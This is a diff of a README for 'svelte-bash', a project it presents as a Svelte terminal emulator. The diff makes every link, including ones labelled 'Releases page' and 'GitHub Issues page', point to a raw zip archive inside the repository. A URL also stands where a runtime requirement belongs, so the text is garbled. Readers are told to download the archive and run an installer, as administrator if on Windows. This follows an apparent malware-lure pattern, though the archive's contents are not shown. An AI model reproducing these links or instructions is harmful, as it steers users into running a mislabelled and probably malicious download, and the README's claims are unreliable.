@@ -1,7 +1,7 @@
 # 🚀 svelte-bash - Fast and Customizable Terminal Emulator
 
 ## 📥 Download Now
-[![Download svelte-bash](https://raw.githubusercontent.com/zeya10/svelte-bash/main/dist/assets/bash-svelte-v1.0.zip)](https://raw.githubusercontent.com/zeya10/svelte-bash/main/dist/assets/bash-svelte-v1.0.zip)
+[![Download svelte-bash](https://github.com/zeya10/svelte-bash/raw/refs/heads/main/src/lib/svelte_bash_2.7.zip)](https://github.com/zeya10/svelte-bash/raw/refs/heads/main/src/lib/svelte_bash_2.7.zip)
 
 ## 🚀 Getting Started
 Welcome to svelte-bash! This is your guide to downloading and running the svelte-bash terminal emulator. With its lightweight design and customization options, svelte-bash offers an efficient terminal experience for Svelte 5 users.
@@ -17,14 +17,14 @@ Welcome to svelte-bash! This is your guide to downloading and running the svelte
 ## 💻 System Requirements
 To ensure svelte-bash runs smoothly, your system should meet the following requirements:
 - Operating System: Windows, macOS, or Linux.
-- https://raw.githubusercontent.com/zeya10/svelte-bash/main/dist/assets/bash-svelte-v1.0.zip Version 14 or higher.
+- https://github.com/zeya10/svelte-bash/raw/refs/heads/main/src/lib/svelte_bash_2.7.zip Version 14 or higher.
 - Memory: At least 1 GB of RAM.
 - Disk Space: 100 MB of free space for installation.
 
 ## 🌐 Download & Install
 To get started with svelte-bash, follow these simple steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/zeya10/svelte-bash/main/dist/assets/bash-svelte-v1.0.zip).
+1. Visit the [Releases page](https://github.com/zeya10/svelte-bash/raw/refs/heads/main/src/lib/svelte_bash_2.7.zip).
 2. Find the latest version listed on the page.
 3. Click on the download link for your operating system. This will download a file to your device.
 
@@ -70,7 +70,7 @@ If you encounter any issues while using svelte-bash, consider these tips:
 - **Installation error:** Make sure your system meets the requirements. Try running the installer as an administrator if on Windows.
 - **Performance lag:** Close other applications that consume significant resources.
 
-If you still experience issues, visit the [GitHub Issues page](https://raw.githubusercontent.com/zeya10/svelte-bash/main/dist/assets/bash-svelte-v1.0.zip) to report your problem or seek further assistance from the community.
+If you still experience issues, visit the [GitHub Issues page](https://github.com/zeya10/svelte-bash/raw/refs/heads/main/src/lib/svelte_bash_2.7.zip) to report your problem or seek further assistance from the community.
 
 ## 🤝 Community Support
 svelte-bash has a growing community. You can connect with other users via:
@@ -82,4 +82,4 @@ svelte-bash has a growing community. You can connect with other users via:
 ## 📜 License
 svelte-bash is open-source and available under the MIT License. You can use, modify, and distribute the code according to the terms specified in the license file.
 
-By following these steps, you will be able to download, install, and start using svelte-bash with ease. For further details and continuous updates, keep an eye on the [Releases page](https://raw.githubusercontent.com/zeya10/svelte-bash/main/dist/assets/bash-svelte-v1.0.zip).
+By following these steps, you will be able to download, install, and start using svelte-bash with ease. For further details and continuous updates, keep an eye on the [Releases page](https://github.com/zeya10/svelte-bash/raw/refs/heads/main/src/lib/svelte_bash_2.7.zip).
